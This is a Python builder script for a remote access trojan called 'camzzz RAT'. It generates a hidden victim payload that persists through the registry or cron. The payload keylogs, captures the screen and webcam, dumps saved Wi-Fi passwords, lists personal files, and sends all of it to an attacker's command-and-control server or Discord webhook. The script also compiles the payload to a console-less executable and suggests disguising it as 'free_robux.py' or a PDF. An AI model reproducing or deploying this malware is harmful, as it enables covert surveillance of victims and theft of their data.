#!/usr/bin/env python3
# camzzz RAT Builder — generates victim payload
# Run this on YOUR machine, send the output to the victim

import os, sys, subprocess, textwrap

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    print("""
\033[95m╔══════════════════════════════════════════════════╗
║           camzzz RAT Builder                    ║
║  Generates a payload that collects everything   ║
║  and sends it to your Discord webhook           ║
╚══════════════════════════════════════════════════╝\033[0m
""")

def build_c(webhook, out_dir):
    """Patch dropper.c with the webhook and compile it."""
    src = os.path.join(out_dir, "dropper.c")
    if not os.path.isfile(src):
        print("\033[91m[-] dropper.c not found next to rat_builder.py\033[0m")
        input("  Press Enter..."); return

    # Parse webhook URL → host + path
    import urllib.parse
    p = urllib.parse.urlparse(webhook)
    host   = p.netloc   # discord.com
    path   = p.path     # /api/webhooks/...

    # Read source and patch constants
    with open(src, "r", encoding="utf-8") as f:
        code = f.read()

    code = code.replace(
        'WEBHOOK_HOST  L"discord.com"',
        f'WEBHOOK_HOST  L"{host}"'
    )
    code = code.replace(
        'WEBHOOK_PATH  L"/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"',
        f'WEBHOOK_PATH  L"{path}"'
    )

    patched_src = os.path.join(out_dir, "dropper_patched.c")
    with open(patched_src, "w", encoding="utf-8") as f:
        f.write(code)

    print("\n\033[93m[*] Webhook patched into source.\033[0m")
    print("\033[96m[i] Compile commands:\033[0m")
    print("    Windows (MinGW):")
    print("      gcc dropper_patched.c -o dropper.exe -lwinhttp -lws2_32 -lgdi32 -lole32 -luuid -mwindows -O2")
    print()
    print("    Linux → Windows cross-compile:")
    print("      x86_64-w64-mingw32-gcc dropper_patched.c -o dropper.exe -lwinhttp -lws2_32 -lgdi32 -lole32 -luuid -mwindows -O2")

    # Try to compile automatically
    compilers = [
        "x86_64-w64-mingw32-gcc",
        "gcc",
    ]
    flags = [
        "dropper_patched.c", "-o",
        os.path.join(out_dir, "dropper.exe"),
        "-lwinhttp", "-lws2_32", "-lgdi32",
        "-lole32", "-luuid", "-mwindows", "-O2",
    ]
    compiled = False
    for cc in compilers:
        check = subprocess.run([cc, "--version"], capture_output=True)
        if check.returncode == 0:
            print(f"\n\033[93m[*] Compiling with {cc}...\033[0m")
            result = subprocess.run(
                [cc] + flags,
                capture_output=True, text=True,
                cwd=out_dir
            )
            if result.returncode == 0:
                exe = os.path.join(out_dir, "dropper.exe")
                sz  = os.path.getsize(exe) // 1024
                print(f"\033[92m[+] dropper.exe ready: {exe}  ({sz} KB)\033[0m")
                compiled = True
                break
            else:
                print(f"\033[91m[!] Compile error:\033[0m\n{result.stderr[-400:]}")
                break

    if not compiled:
        print("\033[91m[-] No compiler found — compile manually with the commands above.\033[0m")
        print("    Install on Linux:  sudo apt install mingw-w64")
        print("    Install on Windows: https://www.mingw-w64.org/")

    input("\n  Press Enter...")


def main():
    clear()
    banner()

    print("\033[96m[?] Language / Output type\033[0m")
    print("  [1] Python  (.py / .exe via PyInstaller) — all platforms, auto-installs deps")
    print("  [2] C       (.exe via MinGW)             — Windows only, tiny (~80KB), no Python needed\n")
    lang = input("  Choice [1/2]: ").strip()

    print("\n\033[96m[?] C2 Server URL\033[0m")
    print("    → Start c2_server.py first, it will show you the URL")
    print("    → Example: http://192.168.1.10:8080  or  https://xxxx.ngrok.io")
    c2_url = input("\n  C2 URL: ").strip().rstrip("/")
    if not c2_url.startswith("http"):
        print("\033[91m[-] Invalid URL.\033[0m"); input(); return

    out_dir = os.path.dirname(os.path.abspath(__file__))

    if lang == "2":
        build_c(c2_url, out_dir)
        return

    print("\n\033[96m[?] Output filename for the victim file\033[0m")
    out_name = input("  Filename [payload.py]: ").strip() or "payload.py"
    if not out_name.endswith(".py"):
        out_name += ".py"

    out_path = os.path.join(out_dir, out_name)

    # ── Generate victim payload ──────────────────────────────────────────────
    payload = f'''#!/usr/bin/env python3
# camzzz victim payload — runs silently, sends everything to C2 server
import os, sys, subprocess, platform, socket, time, threading, zipfile, tempfile
from datetime import datetime

C2 = {repr(c2_url)}

# ── auto-install ─────────────────────────────────────────────────────────────
def pip(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet",
                           "--break-system-packages"],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def try_import(mod, pkg=None):
    try: return __import__(mod)
    except ImportError:
        pip(pkg or mod)
        return __import__(mod)

# ── hide console window (Windows) ────────────────────────────────────────────
def hide():
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except: pass

# ── send to C2 server ────────────────────────────────────────────────────────
def c2_post(endpoint, data, headers=None):
    requests = try_import("requests")
    h = {{"X-Victim": socket.gethostname()}}
    if headers: h.update(headers)
    try:
        requests.post(C2 + endpoint, data=data, headers=h, timeout=15)
    except Exception as e:
        pass  # silent

def send_file(path, fname=None):
    if not os.path.isfile(path): return
    with open(path, "rb") as f:
        data = f.read()
    name = fname or os.path.basename(path)
    c2_post("/upload", data, {{"X-Filename": name}})

def send_text(text, fname="data.txt"):
    c2_post("/text", text.encode("utf-8", errors="replace"),
            {{"X-Filename": fname}})

def send_keylog(text):
    c2_post("/keylog", text.encode("utf-8", errors="replace"))

# ── collectors ───────────────────────────────────────────────────────────────
def collect_sysinfo():
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except: local_ip = "?"
    try:
        requests = try_import("requests")
        pub = requests.get("https://api.ipify.org", timeout=5).text.strip()
    except: pub = "?"
    lines = [
        "=" * 44,
        "  camzzz RAT — VICTIM INFO",
        "=" * 44,
        f"Hostname    : {{socket.gethostname()}}",
        f"User        : {{os.environ.get('USERNAME') or os.environ.get('USER','?')}}",
        f"OS          : {{platform.platform()}}",
        f"Arch        : {{platform.machine()}}",
        f"Python      : {{platform.python_version()}}",
        f"Local IP    : {{local_ip}}",
        f"Public IP   : {{pub}}",
        f"Time        : {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}",
        f"Script path : {{os.path.abspath(__file__)}}",
    ]
    # Windows extras
    if sys.platform == "win32":
        try:
            import ctypes
            admin = ctypes.windll.shell32.IsUserAnAdmin()
            lines.append(f"Admin       : {{\'Yes\' if admin else \'No\'}}")
        except: pass
    return "\\n".join(lines)

def collect_screenshot(folder):
    try:
        pyautogui = try_import("pyautogui")
        path = os.path.join(folder, "screenshot.png")
        pyautogui.screenshot().save(path)
        return path
    except Exception as e:
        # Fallback PowerShell on Windows
        if sys.platform == "win32":
            try:
                path = os.path.join(folder, "screenshot.png")
                ps = (
                    "Add-Type -AssemblyName System.Windows.Forms;"
                    "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
                    "$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height);"
                    "$g=[System.Drawing.Graphics]::FromImage($b);"
                    "$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);"
                    f"$b.Save('{path}')"
                )
                subprocess.run(["powershell","-NoProfile","-Command",ps],
                               capture_output=True, timeout=15)
                if os.path.isfile(path): return path
            except: pass
        return None

def collect_webcam(folder):
    try:
        cv2 = try_import("cv2", "opencv-python")
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): return None
        time.sleep(0.5)
        ret, frame = cap.read()
        cap.release()
        if ret:
            path = os.path.join(folder, "webcam.jpg")
            cv2.imwrite(path, frame)
            return path
    except Exception as e:
        # Fallback: PowerShell/C# DirectShow on Windows
        if sys.platform == "win32":
            try:
                path = os.path.join(folder, "webcam.bmp")
                cs = r"""
Add-Type -TypeDefinition @'
using System;using System.Runtime.InteropServices;using System.Threading;
public class WC{{
[DllImport("avicap32.dll")]static extern IntPtr capCreateCaptureWindowA(string n,int f,int x,int y,int w,int h,IntPtr p,int i);
[DllImport("user32.dll")]static extern bool SendMessage(IntPtr h,int m,int w,int l);
const int WS_POPUP=unchecked((int)0x80000000);
public static void Snap(string f){{
var h=capCreateCaptureWindowA("",WS_POPUP,0,0,320,240,IntPtr.Zero,0);
SendMessage(h,0x400+10,0,0);Thread.Sleep(1000);
SendMessage(h,0x400+60,0,0);
SendMessage(h,0x400+23,0,System.Runtime.InteropServices.Marshal.StringToHGlobalAnsi(f).ToInt32());
SendMessage(h,0x400+11,0,0);}}
}}
'@ -Language CSharp
[WC]::Snap("""
                cs += f'"{path}")'
                subprocess.run(["powershell","-NoProfile","-Command", cs],
                               capture_output=True, timeout=15)
                if os.path.isfile(path): return path
            except: pass
    return None

def collect_keylog(folder, duration=30):
    path = os.path.join(folder, f"keylog_{{duration}}s.txt")
    try:
        keyboard = try_import("keyboard")
        keyboard.start_recording()
        time.sleep(duration)
        events = keyboard.stop_recording()
        keys = ""
        for e in events:
            if e.event_type == "down":
                if len(e.name) == 1:
                    keys += e.name
                elif e.name == "space":
                    keys += " "
                elif e.name == "enter":
                    keys += "\\n"
                elif e.name == "backspace":
                    keys += "[DEL]"
                else:
                    keys += f"[{{e.name}}]"
        with open(path, "w", encoding="utf-8") as f:
            f.write(keys or "[no input captured]")
        return path
    except Exception as e:
        with open(path, "w") as f:
            f.write(f"[keylog error: {{e}}]")
        return path

def collect_wifi():
    lines = []
    if sys.platform == "win32":
        try:
            out = subprocess.check_output("netsh wlan show profiles",
                shell=True, stderr=subprocess.DEVNULL).decode("cp850","ignore")
            for line in out.splitlines():
                if "All User Profile" in line or "Profil" in line:
                    name = line.split(":")[-1].strip()
                    try:
                        pw_out = subprocess.check_output(
                            f'netsh wlan show profile name="{{name}}" key=clear',
                            shell=True, stderr=subprocess.DEVNULL).decode("cp850","ignore")
                        for l in pw_out.splitlines():
                            if "Key Content" in l or "Contenu de la cl" in l:
                                pw = l.split(":")[-1].strip()
                                lines.append(f"{{name}} : {{pw}}")
                                break
                        else:
                            lines.append(f"{{name}} : [no password / open]")
                    except: lines.append(f"{{name}} : [error]")
        except Exception as e:
            lines.append(f"[wifi error] {{e}}")
    else:
        # Linux — read NetworkManager configs
        nm_dir = "/etc/NetworkManager/system-connections/"
        if os.path.isdir(nm_dir):
            for f in os.listdir(nm_dir):
                fpath = os.path.join(nm_dir, f)
                try:
                    content = open(fpath).read()
                    for l in content.splitlines():
                        if l.startswith("psk="):
                            lines.append(f"{{f}} : {{l[4:]}}")
                            break
                except: pass
        wpa = "/etc/wpa_supplicant/wpa_supplicant.conf"
        if os.path.isfile(wpa):
            lines.append("\\n-- wpa_supplicant.conf --")
            try: lines.append(open(wpa).read())
            except: pass
    return "\\n".join(lines) if lines else "[no wifi data]"

def collect_files_list():
    home = os.path.expanduser("~")
    dirs = {{
        "Desktop":   os.path.join(home, "Desktop"),
        "Downloads": os.path.join(home, "Downloads"),
        "Documents": os.path.join(home, "Documents"),
        "Pictures":  os.path.join(home, "Pictures"),
    }}
    lines = []
    for label, path in dirs.items():
        lines.append(f"\\n=== {{label}} ({{path}}) ===")
        if os.path.isdir(path):
            for entry in os.scandir(path):
                try:
                    size = entry.stat().st_size if entry.is_file() else 0
                    tag = "[D]" if entry.is_dir() else "[F]"
                    lines.append(f"  {{tag}} {{entry.name}}" +
                                 (f"  ({{size:,}} bytes)" if entry.is_file() else ""))
                except: pass
        else:
            lines.append("  [not found]")
    return "\\n".join(lines)

def persist():
    exe = os.path.abspath(sys.argv[0])
    try:
        if sys.platform == "win32":
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ,
                f'pythonw "{{exe}}"')
            winreg.CloseKey(key)
        else:
            cron = f"@reboot {{sys.executable}} {{exe}}"
            subprocess.run(
                f'(crontab -l 2>/dev/null; echo "{{cron}}") | crontab -',
                shell=True, capture_output=True)
    except: pass

# ── main ─────────────────────────────────────────────────────────────────────
def run():
    hide()
    persist()

    hostname = socket.gethostname()
    folder   = os.path.join(tempfile.gettempdir(), f"loot_{{hostname}}")
    os.makedirs(folder, exist_ok=True)

    # 1. Ping C2 with sysinfo JSON
    try:
        local_ip = socket.gethostbyname(hostname)
    except: local_ip = "?"
    try:
        pub = try_import("requests").get("https://api.ipify.org", timeout=5).text.strip()
    except: pub = "?"
    is_admin = "?"
    if sys.platform == "win32":
        try:
            import ctypes
            is_admin = "Yes" if ctypes.windll.shell32.IsUserAnAdmin() else "No"
        except: pass

    import json as _json
    ping_data = _json.dumps({{
        "user":       os.environ.get("USERNAME") or os.environ.get("USER","?"),
        "os":         platform.platform(),
        "arch":       platform.machine(),
        "local_ip":   local_ip,
        "public_ip":  pub,
        "admin":      is_admin,
        "python":     platform.python_version(),
        "script":     os.path.abspath(__file__),
    }}).encode()
    c2_post("/ping", ping_data)

    # 2. Collect and send each piece
    sysinfo = collect_sysinfo()
    send_text(sysinfo, "sysinfo.txt")

    flist = collect_files_list()
    send_text(flist, "files.txt")

    wifi = collect_wifi()
    send_text(wifi, "wifi.txt")

    ss = collect_screenshot(folder)
    if ss: send_file(ss)

    wc = collect_webcam(folder)
    if wc: send_file(wc)

    # 3. Keylog 30s in background
    def kl_loop():
        while True:
            kp = collect_keylog(folder, 30)
            with open(kp, "r", encoding="utf-8", errors="replace") as f:
                data = f.read()
            send_keylog(data)
    threading.Thread(target=kl_loop, daemon=True).start()

    # 4. Screenshot loop every 5min
    def ss_loop():
        while True:
            time.sleep(300)
            s = collect_screenshot(folder)
            if s: send_file(s, f"screenshot_{{int(time.time())}}.png")
    threading.Thread(target=ss_loop, daemon=True).start()

    # 5. Zip everything and send
    def zip_loop():
        time.sleep(35)
        while True:
            zip_path = folder + ".zip"
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
                for fname in os.listdir(folder):
                    zf.write(os.path.join(folder, fname), fname)
            send_file(zip_path, f"loot_{{hostname}}.zip")
            c2_post("/done", b"")
            time.sleep(3600)
    threading.Thread(target=zip_loop, daemon=True).start()

    # Keep alive
    while True:
        time.sleep(3600)

if __name__ == "__main__":
    run()
'''

    with open(out_path, "w", encoding="utf-8") as f:
        f.write(payload)

    print(f"\n\033[92m[+] Payload generated: {out_path}\033[0m")
    print(f"\n\033[96m[i] What you receive on your C2 ({c2_url}):\033[0m")
    print(f"    loot/<hostname>/sysinfo.txt    — hostname, user, OS, IPs, admin")
    print(f"    loot/<hostname>/screenshot.png — screen capture")
    print(f"    loot/<hostname>/webcam.jpg     — webcam photo")
    print(f"    loot/<hostname>/keylog.txt     — live keylog (appended every 30s)")
    print(f"    loot/<hostname>/wifi.txt       — all wifi passwords")
    print(f"    loot/<hostname>/files.txt      — Desktop/Downloads/Documents/Pictures")
    print(f"    loot/<hostname>.zip            — full archive, sent every hour")
    print(f"\n\033[93m[i] Make sure c2_server.py is running before the victim opens the payload.\033[0m")

    # Try to compile to .exe
    print(f"\n\033[96m[?] Compile to .exe? (no Python needed on victim)\033[0m")
    print(f"    Requires: pip install pyinstaller")
    do_compile = input("\n  Compile now? [y/N]: ").strip().lower()
    if do_compile == "y":
        pi = subprocess.run(["pyinstaller","--version"], capture_output=True)
        if pi.returncode != 0:
            print("\033[91m[-] PyInstaller not found. Run: pip install pyinstaller\033[0m")
        else:
            icon = input("  Icon .ico path (Enter to skip): ").strip().strip('"')
            exe_name = os.path.splitext(out_name)[0]
            cmd = ["pyinstaller", "--onefile", "--noconsole",
                   "--name", exe_name, out_path]
            if icon and os.path.isfile(icon):
                cmd += ["--icon", icon]
            print("\n\033[93m[*] Compiling...\033[0m")
            result = subprocess.run(cmd, capture_output=True, text=True)
            exe_path = os.path.join(out_dir, "dist", exe_name + ".exe")
            if result.returncode == 0 and os.path.isfile(exe_path):
                print(f"\033[92m[+] EXE ready: {exe_path}\033[0m")
            else:
                # Try Linux
                exe_path_linux = os.path.join(out_dir, "dist", exe_name)
                if os.path.isfile(exe_path_linux):
                    print(f"\033[92m[+] Binary ready: {exe_path_linux}\033[0m")
                else:
                    print(f"\033[91m[!] Compile error:\033[0m")
                    print(result.stderr[-500:])

    print(f"\n\033[96m[i] Send to victim:\033[0m  {out_path}")
    print(f"\033[96m[i] Disguise tip:\033[0m  rename to something like 'free_robux.py', 'setup.py', 'game_crack.py'")
    print(f"\033[96m[i] Or compile to .exe and change the icon to look like a PDF/image.\033[0m")
    input("\n  Press Enter to exit...")

if __name__ == "__main__":
    main()
